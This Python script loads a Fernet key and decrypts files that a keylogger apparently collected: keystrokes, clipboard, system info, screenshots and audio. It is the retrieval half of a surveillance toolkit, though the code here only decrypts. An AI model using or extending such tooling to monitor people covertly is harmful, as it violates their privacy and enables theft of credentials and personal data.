from cryptography.fernet import Fernet
import os

# Load the encryption key from the file
def load_key():
    try:
        with open(r"F:\keylogger\encryption_key.txt", "rb") as key_file:
            key = key_file.read()
            print("Encryption key loaded successfully.")
            return key
    except FileNotFoundError:
        print("Encryption key file not found.")
        return None
    except Exception as e:
        print(f"Error loading encryption key: {str(e)}")
        return None

# Decrypt a single file
def decrypt_file(encrypted_file_path, key):
    try:
        with open(encrypted_file_path, "rb") as enc_file:
            encrypted_data = enc_file.read()

        fernet = Fernet(key)
        decrypted_data = fernet.decrypt(encrypted_data)

        # Save the decrypted data to a file with the same name but without ".encrypted"
        decrypted_file_path = encrypted_file_path.replace(".encrypted", "")
        with open(decrypted_file_path, "wb") as dec_file:  # "wb" for binary writing
            dec_file.write(decrypted_data)

        print(f"Decrypted file saved as {decrypted_file_path}")
        return decrypted_file_path
    except Exception as e:
        print(f"Error decrypting file {encrypted_file_path}: {str(e)}")
        return None

# Decrypt all encrypted files
def decrypt_files():
    # Load the encryption key
    key = load_key()
    if key is None:
        return

    # Define paths to encrypted files
    encrypted_files = [
        r"C:\Users\prana\Documents\KeyLoggerFiles\systeminfo.txt.encrypted",
        r"C:\Users\prana\Documents\KeyLoggerFiles\clipboard.txt.encrypted",
        r"C:\Users\prana\Documents\KeyLoggerFiles\key_log.txt.encrypted",
        r"C:\Users\prana\Documents\KeyLoggerFiles\screenshot.png.encrypted",
        r"C:\Users\prana\Documents\KeyLoggerFiles\audio.wav.encrypted"
    ]

    for filepath in encrypted_files:
        if os.path.exists(filepath):
            print(f"Decrypting {filepath}...")
            decrypt_file(filepath, key)
        else:
            print(f"File {filepath} not found. Skipping.")

# Run the decryption process
if __name__ == "__main__":
    decrypt_files()


